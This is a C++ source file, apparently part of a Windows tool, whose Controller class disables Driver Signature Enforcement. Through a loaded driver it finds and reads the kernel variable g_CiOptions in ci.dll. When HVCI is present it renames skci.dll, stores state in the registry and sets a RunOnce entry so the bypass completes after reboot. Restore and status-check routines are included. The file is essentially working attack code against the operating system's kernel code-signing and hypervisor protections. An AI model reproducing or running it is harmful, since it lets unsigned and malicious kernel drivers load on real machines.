#include "Controller.h"
#include "common.h"

bool Controller::DisableDSE() noexcept {
    PerformAtomicCleanup();
    
    if (!BeginDriverSession()) {
        ERROR(L"Failed to start driver session for DSE bypass");
        return false;
    }
    
    if (!m_rtc->Initialize()) {
        ERROR(L"Failed to initialize driver handle");
        EndDriverSession(true);
        return false;
    }
    
    DEBUG(L"Driver handle opened successfully");
    
    if (!m_dseBypass) {
        m_dseBypass = std::make_unique<DSEBypass>(m_rtc, &m_trustedInstaller);
    }
    
    auto ciBase = m_dseBypass->GetKernelModuleBase("ci.dll");
    if (!ciBase) {
        ERROR(L"Failed to locate ci.dll");
        EndDriverSession(true);
        return false;
    }
    
    ULONG_PTR ciOptionsAddr = m_dseBypass->FindCiOptions(ciBase.value());
    if (!ciOptionsAddr) {
        ERROR(L"Failed to locate g_CiOptions");
        EndDriverSession(true);
        return false;
    }
    
    auto current = m_rtc->Read32(ciOptionsAddr);
    if (!current) {
        ERROR(L"Failed to read g_CiOptions");
        EndDriverSession(true);
        return false;
    }
    
    DWORD currentValue = current.value();
    DEBUG(L"Current g_CiOptions: 0x%08X", currentValue);
    
    bool hvciEnabled = (currentValue & 0x0001C000) != 0;
    
    if (hvciEnabled) {
        std::wcout << L"\n";
        INFO(L"HVCI/VBS protection detected: g_CiOptions = 0x%08X", currentValue);
        INFO(L"Direct kernel memory patching blocked by hypervisor");
        INFO(L"Initiating non-invasive HVCI bypass strategy...");
        std::wcout << L"\n";
        
        SUCCESS(L"Secure Kernel module prepared for temporary deactivation");
		SUCCESS(L"System configuration: hypervisor bypass prepared (fully reversible)");
        INFO(L"No files will be permanently modified or deleted");
		INFO(L"After reboot: hypervisor disabled, DSE bypass automatic, changes reverted");
        std::wcout << L"\n";
        
        DEBUG(L"Closing driver handle before file operations...");
        m_rtc->Cleanup();
        
        DEBUG(L"Unloading and removing driver service...");
        EndDriverSession(true);
        
        DEBUG(L"Driver fully unloaded, proceeding with skci.dll rename...");
        
        if (!m_dseBypass->RenameSkciLibrary()) {
            ERROR(L"Failed to rename skci.dll");
            return false;
        }
        
        if (!m_dseBypass->SaveDSEState(currentValue)) {
            ERROR(L"Failed to save DSE state to registry");
            return false;
        }
        
        if (!m_dseBypass->CreateRunOnceEntry()) {
            ERROR(L"Failed to create RunOnce entry");
            return false;
        }
        
        SUCCESS(L"HVCI bypass prepared successfully");
        INFO(L"System will disable hypervisor on next boot");
        INFO(L"Reboot required to complete DSE bypass");
        INFO(L"After reboot, DSE will be automatically disabled");
        
        std::wcout << L"\n";
        std::wcout << L"Reboot now to complete DSE bypass? [Y/N]: ";
        wchar_t choice;
        std::wcin >> choice;
        
        if (choice == L'Y' || choice == L'y') {
            INFO(L"Initiating system reboot...");
            system("shutdown /r /t 0");
        }
        
        return true;
    }
    
    bool result = m_dseBypass->DisableDSE();
    
    EndDriverSession(true);
    
    return result;
}

bool Controller::RestoreDSE() noexcept {
    PerformAtomicCleanup();
    
    if (!BeginDriverSession()) {
        ERROR(L"Failed to start driver session for DSE restore");
        return false;
    }
    
    if (!m_rtc->Initialize()) {
        ERROR(L"Failed to initialize driver handle");
        EndDriverSession(true);
        return false;
    }
    
    m_dseBypass = std::make_unique<DSEBypass>(m_rtc, &m_trustedInstaller);
    
    bool result = m_dseBypass->RestoreDSE();
    
    EndDriverSession(true);
    
    return result;
}

bool Controller::DisableDSEAfterReboot() noexcept {
    PerformAtomicCleanup();
    
    if (!BeginDriverSession()) {
        ERROR(L"Failed to start driver session for post-reboot DSE bypass");
        return false;
    }
    
    if (!m_rtc->Initialize()) {
        ERROR(L"Failed to initialize driver handle");
        EndDriverSession(true);
        return false;
    }
    
    DEBUG(L"Driver handle opened successfully");
    
    m_dseBypass = std::make_unique<DSEBypass>(m_rtc, &m_trustedInstaller);
    
    bool result = m_dseBypass->DisableDSEAfterReboot();
    
    EndDriverSession(true);
    
    return result;
}

ULONG_PTR Controller::GetCiOptionsAddress() const noexcept {
    if (!m_dseBypass) {
        return 0;
    }
    
    return m_dseBypass->GetCiOptionsAddress();
}

bool Controller::GetDSEStatus(ULONG_PTR& outAddress, DWORD& outValue) noexcept {
    PerformAtomicCleanup();
    
    if (!BeginDriverSession()) {
        ERROR(L"Failed to start driver session for DSE status check");
        return false;
    }
    
    if (!m_rtc->Initialize()) {
        ERROR(L"Failed to initialize driver handle");
        EndDriverSession(true);
        return false;
    }
    
    if (!m_dseBypass) {
        m_dseBypass = std::make_unique<DSEBypass>(m_rtc, &m_trustedInstaller);
    }
    
    auto ciBase = m_dseBypass->GetKernelModuleBase("ci.dll");
    if (!ciBase) {
        ERROR(L"Failed to locate ci.dll");
        EndDriverSession(true);
        return false;
    }
    
    outAddress = m_dseBypass->FindCiOptions(ciBase.value());
    if (outAddress == 0) {
        ERROR(L"Failed to locate g_CiOptions address");
        EndDriverSession(true);
        return false;
    }
    
    auto currentValue = m_rtc->Read32(outAddress);
    if (!currentValue) {
        ERROR(L"Failed to read g_CiOptions value");
        EndDriverSession(true);
        return false;
    }
    
    outValue = currentValue.value();
    
    EndDriverSession(true);
    return true;
}